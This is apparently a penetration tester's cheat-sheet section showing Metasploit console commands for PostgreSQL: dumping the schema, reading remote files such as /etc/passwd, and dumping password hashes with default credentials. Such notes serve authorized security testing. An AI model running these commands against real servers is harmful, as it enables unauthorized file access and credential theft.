# Metasploit

## 02 - SQL Queries

### 2.1 - Schema

```
msf > use auxiliary/scanner/postgres/postgres_schemadump

msf auxiliary(scanner/postgres/postgres_schemadump) > options

Module options (auxiliary/scanner/postgres/postgres_schemadump):

   Name               Current Setting      Required  Description
   ----               ---------------      --------  -----------
   DATABASE           postgres             yes       The database to authenticate against
   DISPLAY_RESULTS    true                 yes       Display the Results to the Screen
   IGNORED_DATABASES  template1,template0  yes       Comma separated list of databases to ignore during the schema dump
   PASSWORD           postgres             no        The password for the specified username. Leave blank for a random password.
   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              5432                 yes       The target port
   THREADS            1                    yes       The number of concurrent threads (max one per host)
   USERNAME           postgres             yes       The username to authenticate as

msf auxiliary(scanner/postgres/postgres_schemadump) > set database <database>

msf auxiliary(scanner/postgres/postgres_schemadump) > set ignored_databases <database1>,<database2>,<etc>

msf auxiliary(scanner/postgres/postgres_schemadump) > run postgres://<username>:<password>@<IP> threads=8
```

### 2.2 - Read File

```
msf > use auxiliary/admin/postgres/postgres_readfile

msf auxiliary(admin/postgres/postgres_readfile) > options

Module options (auxiliary/admin/postgres/postgres_readfile):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RFILE     /etc/passwd      yes       The remote file
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output

msf auxiliary(admin/postgres/postgres_readfile) > set database <database>

msf auxiliary(admin/postgres/postgres_readfile) > set rfile </path/to/file>

msf auxiliary(admin/postgres/postgres_readfile) > run postgres://<username>:<password>@<IP> threads=8
```


TODO: Re-arrange from this section to post exploitation under **Enumeration and Discovery**

### 2.3 - Hashdump

```
msf > use auxiliary/scanner/postgres/postgres_hashdump

msf auxiliary(scanner/postgres/postgres_hashdump) > options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as

msf auxiliary(scanner/postgres/postgres_hashdump) > set database <database>

msf auxiliary(scanner/postgres/postgres_hashdump) > run postgres://<username>:<password>@<IP> threads=8
```

---
## References

- [Metasploit Unleashed: Admin Postgre Auxiliary Module](https://www.offsec.com/metasploit-unleashed/admin-postgres-auxiliary-modules/)